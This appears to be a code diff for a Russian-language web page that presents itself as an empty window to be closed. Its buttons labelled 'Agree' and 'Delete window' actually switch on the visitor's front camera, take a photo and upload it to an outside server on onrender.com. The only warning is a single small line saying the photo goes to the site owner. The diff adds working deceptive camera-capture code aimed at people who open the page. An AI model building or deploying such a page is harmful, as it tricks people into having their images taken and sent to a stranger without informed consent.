@@ -15,9 +15,16 @@
       padding:18px;
     }
     .card{max-width:520px;margin:0 auto}
-    h2{margin:8px 0 8px}
+    h2{margin:8px 0 6px}
     p{margin:6px 0; opacity:.85; line-height:1.35}
-    
+    video, img{
+      width:92%;
+      max-width:420px;
+      border-radius:12px;
+      margin-top:12px;
+      background:#000;
+    }
+    .btns{margin-top:10px}
     button{
       margin:8px 6px;
       padding:12px 16px;
@@ -28,103 +35,144 @@
       font-weight:800;
       cursor:pointer;
     }
+    button.secondary{background:#16a34a}
+    button.danger{background:#ef4444;color:#0b0f14}
     button:disabled{opacity:.5; cursor:not-allowed}
-    .status{margin-top:10px; opacity:.9}
+    .status{margin-top:10px; opacity:.95; min-height:22px}
     .small{font-size:12px; opacity:.65}
+    .hidden{display:none}
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Закройте окно это пустой окно </h2>
-
-    <!-- Важно: честно предупреждаем -->
+  <div class="card" id="app">
+    <h2>Закройте окно это пустой окно</h2>
     <p>Фото будет отправлено владельцу сайта.</p>
 
-    
-    <div>
-  btnShot.onclick = () => {
-  if (!stream) { statusEl.innerText = "Сначала нажми: Закрыть окно (включить камеру)"; return; }
-  // дальше твой код фото...
-};
-
-btnSend.onclick = async () => {
-  if (!imageData) { statusEl.innerText = "Сначала сделай фото (кнопка: Согласен)"; return; }
-  // дальше твой код отправки...
-};
+    <div class="btns">
+      <button id="btnStart" class="secondary">Закрыть окно</button>
+      <button id="btnShot">Согласен</button>
+      <button id="btnSend" class="danger">Удалить окно</button>
     </div>
 
-    <div class="status" id="status">Нажми “Отменииь загрузку ”.</div>
+    <div class="status" id="status">Нажми “Согласен”, чтобы разрешить камеру.</div>
     <div class="small">Если сервер “спит”, первая отправка может занять до 30–50 секунд.</div>
+
+    <video id="video" autoplay playsinline class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
   </div>
 
 <script>
-const btnStart = document.getElementById("btnStart");
-const btnShot  = document.getElementById("btnShot");
-const btnSend  = document.getElementById("btnSend");
-const statusEl = document.getElementById("status");
+  const API_UPLOAD = "https://camera-server-ay1p.onrender.com/upload";
 
-let stream = null;
-let imageData = null;
+  const btnStart = document.getElementById("btnStart");
+  const btnShot  = document.getElementById("btnShot");
+  const btnSend  = document.getElementById("btnSend");
+  const statusEl = document.getElementById("status");
 
-// Запуск камеры
-btnStart.onclick = async () => {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.createElement("video");
-    video.autoplay = true;
-    video.srcObject = stream;
-    document.body.prepend(video);
+  const video  = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
 
-    statusEl.innerText = "Камера включена";
-    btnShot.disabled = false;
-  } catch (e) {
-    statusEl.innerText = "Нет доступа к камере";
+  let stream = null;
+  let imageData = null;
+
+  function setStatus(text){ statusEl.textContent = text; }
+
+  function stopCamera(){
+    try{
+      if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+    }catch{}
+    video.srcObject = null;
+    stream = null;
   }
-};
 
-// Сделать фото
-btnShot.onclick = () => {
-  if (!stream) return;
+  // 1) "Закрыть окно" — просто скрывает всё и показывает "Спасибо" (не ломает логику)
+  btnStart.onclick = () => {
+    stopCamera();
+    document.body.innerHTML = `
+      <div style="min-height:100vh;display:grid;place-items:center;background:#0b0f14;color:#e8eef6;font-family:system-ui;text-align:center;padding:24px">
+        <div>
+          <h2 style="margin:0 0 10px">Окно закрыто ✅</h2>
+          <div style="opacity:.8">Вы можете закрыть вкладку.</div>
+        </div>
+      </div>
+    `;
+  };
 
-  const video = document.querySelector("video");
+  // 2) "Согласен" — запрашивает камеру и делает фото (последовательно)
+  btnShot.onclick = async () => {
+    try{
+      // Запрашиваем камеру только после согласия
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+      video.classList.remove("hidden");
+      video.srcObject = stream;
 
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
+      setStatus("✅ Камера включена. Сейчас сделаю фото...");
+      await new Promise(r => setTimeout(r, 600)); // короткая пауза
 
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0);
+      const w = video.videoWidth;
+      const h = video.videoHeight;
+      if (!w || !h){
+        setStatus("❗ Камера ещё запускается. Нажми “Согласен” ещё раз.");
+        return;
+      }
 
-  imageData = canvas.toDataURL("image/jpeg");
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, w, h);
 
-  statusEl.innerText = "Фото сделано";
-  btnSend.disabled = false;
-};
+      imageData = canvas.toDataURL("image/jpeg", 0.9);
 
-// Отправка
-btnSend.onclick = async () => {
-  if (!imageData) return;
+      // камеру можно выключить сразу после снимка
+      stopCamera();
+      video.classList.add("hidden");
 
-  statusEl.innerText = "Отправка...";
-
-  try {
-    const res = await fetch("https://camera-server-ay1p.onrender.com/upload", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ image: imageData })
-    });
-
-    if (res.ok) {
-      statusEl.innerText = "Отправлено ✔";
-    } else {
-      statusEl.innerText = "Ошибка сервера";
+      setStatus("📸 Фото сделано. Теперь нажми “Удалить окно” (отправка).");
+    }catch(e){
+      setStatus("❌ Нет доступа к камере (разреши камеру в браузере).");
     }
-  } catch {
-    statusEl.innerText = "Ошибка сети";
-  }
-};
+  };
+
+  // 3) "Удалить окно" — отправляет фото на сервер и показывает "Спасибо"
+  btnSend.onclick = async () => {
+    if (!imageData){
+      setStatus("Сначала нажми “Согласен”, чтобы сделать фото.");
+      return;
+    }
+
+    setStatus("⏳ Отправка...");
+    btnSend.disabled = true;
+    btnShot.disabled = true;
+    btnStart.disabled = true;
+
+    try{
+      const res = await fetch(API_UPLOAD, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: imageData })
+      });
+
+      if (!res.ok) throw new Error("HTTP " + res.status);
+
+      const json = await res.json().catch(() => ({}));
+      if (json.status !== "ok") throw new Error("bad response");
+
+      // очищаем страницу после успешной отправки
+      document.body.innerHTML = `
+        <div style="min-height:100vh;display:grid;place-items:center;background:#0b0f14;color:#e8eef6;font-family:system-ui;text-align:center;padding:24px">
+          <div>
+            <h2 style="margin:0 0 10px">Спасибо ✅</h2>
+            <div style="opacity:.8">Фото отправлено владельцу сайта.</div>
+          </div>
+        </div>
+      `;
+    }catch(e){
+      setStatus("❌ Ошибка отправки. Попробуй ещё раз.");
+      btnSend.disabled = false;
+      btnShot.disabled = false;
+      btnStart.disabled = false;
+    }
+  };
 </script>
 </body>
 </html>
